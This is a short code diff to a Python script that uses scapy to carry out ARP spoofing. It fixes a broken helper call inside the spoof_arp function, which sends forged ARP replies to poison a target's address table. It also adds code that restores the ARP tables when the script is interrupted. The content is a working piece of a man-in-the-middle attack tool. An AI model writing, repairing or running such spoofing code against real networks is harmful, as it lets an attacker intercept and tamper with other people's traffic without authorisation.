@@ -31,7 +31,7 @@ def get_mac(ip):
         return False
 
 def spoof_arp(dst, src):
-    mac = dst_mac(dst)
+    mac = get_mac(dst)
     if mac != False:
         packet = scapy.ARP(op=2, hwdst=mac, pdst=dst, psrc=src)
         scapy.send(packet, verbose=False)
@@ -70,12 +70,10 @@ def main():
                 break
             time.sleep(sleep)
     except KeyboardInterrupt:
+        restore_arp_tables(dst, src)
+        restore_arp_tables(src, dst)
         print("Interrupted")
         sys.exit(1)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("Interrupted")
-        sys.exit(1)
+    main()
